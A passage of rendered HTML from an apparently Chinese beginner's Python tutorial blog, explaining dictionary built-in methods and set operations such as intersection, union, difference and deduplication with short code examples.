class="line"></span><br><span class="line"><span class="comment"># 2.循环增加</span></span><br><span class="line">keys = [<span class="string">&#x27;k1&#x27;</span>,<span class="string">&#x27;k2&#x27;</span>,<span class="string">&#x27;k3&#x27;</span>]</span><br><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> keys:</span><br><span class="line">    d[key] = <span class="literal">None</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.利用内置的fromkeys方法 (了解)</span></span><br><span class="line">d1 = <span class="built_in">dict</span>.fromkeys(keys,<span class="literal">None</span>) <span class="comment"># 内部就是上面的for循环</span></span><br><span class="line"><span class="built_in">print</span>(d1)</span><br></pre></td></tr></table></figure><h2 id="4、内置方法"><a href="#4、内置方法" class="headerlink" title="4、内置方法"></a>4、内置方法</h2><h3 id="（1）-按照key存取值-可存可取"><a href="#（1）-按照key存取值-可存可取" class="headerlink" title="（1） 按照key存取值:可存可取"></a>（1） 按照key存取值:可存可取</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 3.按照key(键)存取值:可存可取</span></span><br><span class="line">d = &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取值</span></span><br><span class="line"><span class="built_in">print</span>(d[<span class="string">&quot;k1&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 针对赋值操作key存在,则修改</span></span><br><span class="line">d[<span class="string">&#x27;k1&#x27;</span>] = <span class="number">22</span></span><br><span class="line"><span class="built_in">print</span>(d)  <span class="comment"># &#123;&quot;k1&quot;:22&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 增加键值对</span></span><br><span class="line">d[<span class="string">&#x27;k2&#x27;</span>] = <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(d)     <span class="comment"># &#123;&#x27;k1&#x27;: 22, &#x27;k2&#x27;: 3&#125;</span></span><br></pre></td></tr></table></figure><h3 id="（2）-长度-len"><a href="#（2）-长度-len" class="headerlink" title="（2） 长度 len"></a>（2） 长度 len</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;k2&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;k3&#x27;</span>:<span class="number">3</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(d))  <span class="comment"># 3</span></span><br></pre></td></tr></table></figure><h3 id="（3）成员运算-in-和-not-in-根据key"><a href="#（3）成员运算-in-和-not-in-根据key" class="headerlink" title="（3）成员运算 in 和 not in: 根据key"></a>（3）成员运算 in 和 not in: 根据key</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;k2&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;k3&#x27;</span>:<span class="number">33</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;k1&#x27;</span> <span class="keyword">in</span> d)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;k1&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> d)</span><br></pre></td></tr></table></figure><h3 id="（4）-删除"><a href="#（4）-删除" class="headerlink" title="（4） 删除"></a>（4） 删除</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 4.1通用删除</span></span><br><span class="line">d = &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;k2&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;k3&#x27;</span>:<span class="number">33</span>&#125;</span><br><span class="line"><span class="keyword">del</span> d[<span class="string">&#x27;k1&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(d)  <span class="comment"># &#123;&#x27;k2&#x27;:2,&#x27;k3&#x27;:33&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.2 pop删除: 根据key删除元素,返回删除key对应的value值</span></span><br><span class="line">d = &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;k2&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;k3&#x27;</span>:<span class="number">33</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(d.pop(<span class="string">&#x27;k2&#x27;</span>))  <span class="comment"># 2</span></span><br><span class="line"><span class="built_in">print</span>(d)   <span class="comment"># &#123;&#x27;k1&#x27;:1,&#x27;k3&#x27;:33&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.3 popitem删除: 随机删除,返回一个元组(删除的key,value)</span></span><br><span class="line">d = &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;k2&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;k3&#x27;</span>:<span class="number">33</span>&#125;</span><br><span class="line">res = d.popitem()</span><br><span class="line"><span class="built_in">print</span>(res)  <span class="comment"># (&#x27;k3&#x27;,33)</span></span><br><span class="line"><span class="built_in">print</span>(d)    <span class="comment"># &#123;&#x27;k1&#x27;:1,&#x27;k2&#x27;:2&#125;</span></span><br></pre></td></tr></table></figure><h3 id="（5）-键keys-值values-键值对items"><a href="#（5）-键keys-值values-键值对items" class="headerlink" title="（5） 键keys( ) 值values( ) 键值对items( )"></a>（5） 键keys( ) 值values( ) 键值对items( )</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;k2&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;k3&#x27;</span>:<span class="number">33</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(d.keys(),<span class="built_in">type</span>(d.keys())) <span class="comment"># dict_keys([&#x27;k1&#x27;, &#x27;k2&#x27;, &#x27;k3&#x27;]) &lt;class &#x27;dict_keys&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(d.values())              <span class="comment"># dict_values([1, 2, 33])</span></span><br><span class="line"><span class="built_in">print</span>(d.items())               <span class="comment"># dict_items([(&#x27;k1&#x27;, 1), (&#x27;k2&#x27;, 2), (&#x27;k3&#x27;, 33)])</span></span><br></pre></td></tr></table></figure><h3 id="（6）-for循环"><a href="#（6）-for循环" class="headerlink" title="（6） for循环"></a>（6） for循环</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;k2&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;k3&#x27;</span>:<span class="number">33</span>&#125;</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> d.keys():</span><br><span class="line">    <span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> d:</span><br><span class="line">    <span class="built_in">print</span>(k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> d.values():</span><br><span class="line">    <span class="built_in">print</span>(v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> d.items():</span><br><span class="line">    <span class="built_in">print</span>(k,v)</span><br></pre></td></tr></table></figure><h3 id="（7）clear"><a href="#（7）clear" class="headerlink" title="（7）clear( )"></a>（7）clear( )</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 清空字典</span></span><br><span class="line">d = &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;k2&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;k3&#x27;</span>:<span class="number">33</span>&#125;</span><br><span class="line">d.clear()</span><br><span class="line"><span class="built_in">print</span>(d)  <span class="comment"># &#123;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="（8）-update-了解"><a href="#（8）-update-了解" class="headerlink" title="（8） update( ) (了解)"></a>（8） update( ) (了解)</h3><blockquote><p>更新字典,用新字典更新老字典,一切以新字典为准</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;k2&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;k3&#x27;</span>:<span class="number">33</span>&#125;</span><br><span class="line">d.update(&#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">99</span>,<span class="string">&#x27;k4&#x27;</span>:<span class="number">44</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(d)  <span class="comment"># &#123;&#x27;k1&#x27;:99,&#x27;k2&#x27;:2,&#x27;k3&#x27;:33,&#x27;k4&#x27;:44&#125;</span></span><br></pre></td></tr></table></figure><h3 id="（9）-get"><a href="#（9）-get" class="headerlink" title="（9） get( )"></a>（9） get( )</h3><blockquote><p>通过get(key),获取字典中key对应的值 ,不存在默认返回None</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">&#x27;k1&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;k2&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;k3&#x27;</span>: <span class="number">33</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(d.get(<span class="string">&quot;k1&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果key不存在,默认返回None</span></span><br><span class="line"><span class="comment"># if not d.get(&quot;k111&quot;):</span></span><br><span class="line"><span class="comment">#     print(&quot;k111 不存在&quot;)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># get 可以设置第二个参数</span></span><br><span class="line"><span class="built_in">print</span>(d.get(<span class="string">&quot;k111&quot;</span>,<span class="string">&quot;不存在&quot;</span>))</span><br></pre></td></tr></table></figure><h3 id="（10）-setdefault-了解"><a href="#（10）-setdefault-了解" class="headerlink" title="（10） setdefault( )(了解)"></a>（10） setdefault( )(了解)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;k2&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;k3&#x27;</span>:<span class="number">33</span>&#125;</span><br><span class="line"><span class="comment"># 4.1 如果key存在,就不修改原值,返回字典中key对应的值</span></span><br><span class="line"><span class="built_in">print</span>(d.setdefault(<span class="string">&#x27;k1&#x27;</span>,<span class="number">444</span>))  <span class="comment"># 1</span></span><br><span class="line"><span class="built_in">print</span>(d)    <span class="comment"># &#123;&#x27;k1&#x27;:1,&#x27;k2&#x27;:2,&#x27;k3&#x27;:33&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.2 如果key不在,增加新值,返回字典中key对应的值</span></span><br><span class="line"><span class="built_in">print</span>(d.setdefault(<span class="string">&#x27;k4&#x27;</span>,<span class="number">4444</span>))  <span class="comment"># 4444</span></span><br><span class="line"><span class="built_in">print</span>(d)     <span class="comment"># &#123;&#x27;k1&#x27;:1,&#x27;k2&#x27;:2,&#x27;k3&#x27;:33,&#x27;k4&#x27;:4444&#125;</span></span><br></pre></td></tr></table></figure><h1 id="七、-集合"><a href="#七、-集合" class="headerlink" title="七、 集合"></a>七、 集合</h1><h2 id="1、-作用"><a href="#1、-作用" class="headerlink" title="1、 作用"></a>1、 作用</h2><blockquote><p>集合是把一堆值集中在一起来做一个整体方面的操作 , 如关系运算,去重</p><p>如果你去关注把集合中的某一个元素取出来的话,就丧失了创建集合的初衷,你想取出单个值,那么你用列表或者元组就好了.</p></blockquote><h2 id="2、-定义"><a href="#2、-定义" class="headerlink" title="2、  定义"></a>2、  定义</h2><p>&#x3D;&#x3D;在{ }内用逗号分隔开多个元素,多个元素满足以下三个条件&#x3D;&#x3D;</p><ol><li>集合内元素必须是不可变类型</li><li>集合内元素无序</li><li><code>集合内元素没有重复</code></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s1 = &#123;<span class="number">1</span>,<span class="number">2</span>&#125; <span class="comment"># s1 = set(1,2)</span></span><br><span class="line"><span class="built_in">print</span>(s1)</span><br></pre></td></tr></table></figure><p><strong>补充 :</strong> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = &#123;&#125; <span class="comment"># 默认是空字典</span></span><br><span class="line"><span class="built_in">print</span>(s,<span class="built_in">type</span>(s))  <span class="comment"># &#123;&#125; &lt;class dict&gt;</span></span><br><span class="line"><span class="comment"># 定义空集合</span></span><br><span class="line">s = <span class="built_in">set</span>()</span><br><span class="line"><span class="built_in">print</span>(s,<span class="built_in">type</span>(s))  <span class="comment"># &#123;&#125; &lt;class &#x27;set&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3、-类型转换-1"><a href="#3、-类型转换-1" class="headerlink" title="3、  类型转换"></a>3、  类型转换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">set</span>(&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;)  <span class="comment"># 内部和list,tuple一样都是调用的for循环</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">set</span>(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],<span class="number">2</span>]) <span class="comment"># 报错,因为元素中存在了可变的数据类型</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">set</span>(&#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;k2&#x27;</span>:<span class="number">2</span>&#125;) <span class="comment"># 只把key添加到集合中</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><h2 id="4、-关系运算-了解"><a href="#4、-关系运算-了解" class="headerlink" title="4、  关系运算(了解)"></a>4、  关系运算(了解)</h2><h3 id="（1）-交集-amp-x2F-intersection"><a href="#（1）-交集-amp-x2F-intersection" class="headerlink" title="（1） 交集 &amp;&#x2F;intersection"></a>（1） 交集 &amp;&#x2F;intersection</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">friend1 = &#123;<span class="string">&#x27;ymn&#x27;</span>, <span class="string">&#x27;tom&#x27;</span>, <span class="string">&#x27;fangfang&#x27;</span>, <span class="string">&#x27;jack&#x27;</span>&#125;</span><br><span class="line">friend2 = &#123;<span class="string">&#x27;ymn&#x27;</span>, <span class="string">&#x27;benben&#x27;</span>, <span class="string">&#x27;niuniu&#x27;</span>, <span class="string">&#x27;jack&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">res = friend1 &amp; friend2</span><br><span class="line"><span class="built_in">print</span>(res)                             <span class="comment"># &#123;&#x27;ymn&#x27;,&#x27;jack&#x27;&#125;</span></span><br><span class="line"><span class="built_in">print</span>(friend1.intersection(friend2))   <span class="comment"># &#123;&#x27;ymn&#x27;,&#x27;jack&#x27;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="（2）并（合）集-x2F-union"><a href="#（2）并（合）集-x2F-union" class="headerlink" title="（2）并（合）集  |&#x2F;union"></a>（2）并（合）集  |&#x2F;union</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">friend1 = &#123;<span class="string">&#x27;ymn&#x27;</span>, <span class="string">&#x27;tom&#x27;</span>, <span class="string">&#x27;fangfang&#x27;</span>, <span class="string">&#x27;jack&#x27;</span>&#125;</span><br><span class="line">friend2 = &#123;<span class="string">&#x27;ymn&#x27;</span>, <span class="string">&#x27;benben&#x27;</span>, <span class="string">&#x27;niuniu&#x27;</span>, <span class="string">&#x27;jack&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">res = friend1 | friend2  <span class="comment"># &#123;&#x27;ymn&#x27;, &#x27;benben&#x27;,&#x27;tom&#x27;, &#x27;fangfang&#x27;, &#x27;niuniu&#x27;, &#x27;jack&#x27;&#125;</span></span><br><span class="line"><span class="built_in">print</span>(friend1.union(friend2))<span class="comment"># &#123;&#x27;ymn&#x27;,&#x27;benben&#x27;,&#x27;tom&#x27;,&#x27;fangfang&#x27;,&#x27;niuniu&#x27;, &#x27;jack&#x27;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="（3）差集-x2F-difference"><a href="#（3）差集-x2F-difference" class="headerlink" title="（3）差集  -&#x2F;difference"></a>（3）差集  -&#x2F;difference</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">friend1 = &#123;<span class="string">&#x27;ymn&#x27;</span>, <span class="string">&#x27;tom&#x27;</span>, <span class="string">&#x27;fangfang&#x27;</span>, <span class="string">&#x27;jack&#x27;</span>&#125;</span><br><span class="line">friend2 = &#123;<span class="string">&#x27;ymn&#x27;</span>, <span class="string">&#x27;benben&#x27;</span>, <span class="string">&#x27;niuniu&#x27;</span>, <span class="string">&#x27;jack&#x27;</span>&#125;</span><br><span class="line"><span class="comment"># 取friend1独有的好友</span></span><br><span class="line">res = friend1 - friend2</span><br><span class="line"><span class="built_in">print</span>(res)                        <span class="comment"># &#123;&#x27;tom&#x27;, &#x27;fangfang&#x27;&#125;</span></span><br><span class="line"><span class="built_in">print</span>(friend1.difference(friend2))<span class="comment"># &#123;&#x27;tom&#x27;, &#x27;fangfang&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取friend2独有的好友</span></span><br><span class="line">res = friend2 - friend1</span><br><span class="line"><span class="built_in">print</span>(res)     <span class="comment"># &#123;&#x27;benben&#x27;, &#x27;niuniu&#x27;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="（4）-对称差集-x2F-symmetric-difference"><a href="#（4）-对称差集-x2F-symmetric-difference" class="headerlink" title="（4） 对称差集 ^&#x2F;symmetric_difference"></a>（4） 对称差集 ^&#x2F;symmetric_difference</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">friend1 = &#123;<span class="string">&#x27;ymn&#x27;</span>, <span class="string">&#x27;tom&#x27;</span>, <span class="string">&#x27;fangfang&#x27;</span>, <span class="string">&#x27;jack&#x27;</span>&#125;</span><br><span class="line">friend2 = &#123;<span class="string">&#x27;ymn&#x27;</span>, <span class="string">&#x27;benben&#x27;</span>, <span class="string">&#x27;niuniu&#x27;</span>, <span class="string">&#x27;jack&#x27;</span>&#125;</span><br><span class="line"><span class="comment"># 取两个用户独有的好友(即去掉公共的好友)</span></span><br><span class="line"><span class="built_in">print</span>((friend1 - friend2) | (friend2 - friend1)) </span><br><span class="line"><span class="comment"># &#123;&#x27;tom&#x27;,&#x27;fangfang&#x27;,&#x27;benben&#x27;,&#x27;niuniu&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(friend1 ^ friend2)  <span class="comment"># &#123;&#x27;tom&#x27;,&#x27;fangfang&#x27;,&#x27;benben&#x27;,&#x27;niuniu&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(friend1.symmetric_difference(friend2)) </span><br><span class="line"><span class="comment"># &#123;&#x27;tom&#x27;,&#x27;fangfang&#x27;,&#x27;benben&#x27;,&#x27;niuniu&#x27;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="（5）-父子集-包含关系"><a href="#（5）-父子集-包含关系" class="headerlink" title="（5） 父子集 包含关系"></a>（5） 父子集 包含关系</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">s1 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, &#125;</span><br><span class="line">s2 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>&#125;</span><br><span class="line"><span class="comment"># 不存在包含关系,下面比较均为False</span></span><br><span class="line"><span class="built_in">print</span>(s1 &gt; s2)  <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(s1.issuperset(s2)) <span class="comment"># False</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s1 &lt; s2)  <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(s1.issubset(s2))  <span class="comment"># False</span></span><br><span class="line"></span><br><span class="line">s1 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, &#125;</span><br><span class="line">s2 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(s1 &gt; s2)  <span class="comment"># True  当s1大于或等于s2时,才能说s1是s2他爹</span></span><br><span class="line"></span><br><span class="line">s1 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">s2 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(s1 == s2)  <span class="comment"># True s1和s2互为父子集</span></span><br><span class="line"><span class="built_in">print</span>(s1.issuperset(s2)) <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(s2.issuperset(s1)) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><h2 id="5、-去重"><a href="#5、-去重" class="headerlink" title="5、 去重"></a>5、 去重</h2><p>虽然集合具有天然的去重性，但是也有一定的局限性，它只能适用于对顺序没有要求的去重。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.只能针对不可变类型去重</span></span><br><span class="line"><span class="built_in">print</span>((<span class="built_in">set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>])))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.无法保证原来的顺序</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">set</span>([<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;ymn&#x27;</span>])))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通常我们用成员运算也能达到去重的效果</span></span><br><span class="line"><span class="comment"># 小练习:去重</span></span><br><span class="line">l = [</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;ymn&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;tom&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;fangfang&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;tom&#x27;</span>&#125;,</span><br><span class="line">]</span><br><span class="line">new_l = []</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> l:</span><br><span class="line">    <span class="keyword">if</span> item <span class="keyword">not</span> <span class="keyword">in</span> new_l:</span><br><span class="line">        new_l.append(item)</span><br><span class="line"><span class="built_in">print</span>(new_l)</span><br></pre></td></tr></table></figure><h2 id="6、其他内置方法-了解"><a href="#6、其他内置方法-了解" class="headerlink" title="6、其他内置方法(了解)"></a>6、其他内置方法(了解)</h2><h3 id="（1）-删除"><a href="#（1）-删除" class="headerlink" title="（1） 删除"></a>（1） 删除</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s1 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, &#125;</span><br><span class="line">res = s1.discard(<span class="number">5</span>) <span class="comment"># 删除元素,不存在返回None</span></span><br><span class="line"><span class="built_in">print</span>(res)  <span class="comment"># None</span></span><br><span class="line"><span class="built_in">print</span>(s1)  <span class="comment"># &#123;1, 2, 3, 4, &#125;</span></span><br><span class="line"></span><br><span class="line">res = s1.remove(<span class="number">5</span>) <span class="comment"># 删除元素,不存在报错</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(s1)</span><br></pre></td></tr></table></figure><h3 id="（2）-clear"><a href="#（2）-clear" class="headerlink" title="（2）  clear( )"></a>（2）  clear( )</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 清空集合</span></span><br><span class="line">s1 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, &#125;</span><br><span class="line">s1.clear()</span><br><span class="line"><span class="built_in">print</span>(s1)    <span class="comment"># &#123;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="（3）-pop"><a href="#（3）-pop" class="headerlink" title="（3）  pop ( )"></a>（3）  pop ( )</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 随机删除集合的一个元素</span></span><br><span class="line">s1 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, &#125;</span><br><span class="line"><span class="built_in">print</span>(s1.pop())  <span class="comment"># 2</span></span><br><span class="line"><span class="built_in">print</span>(s1)        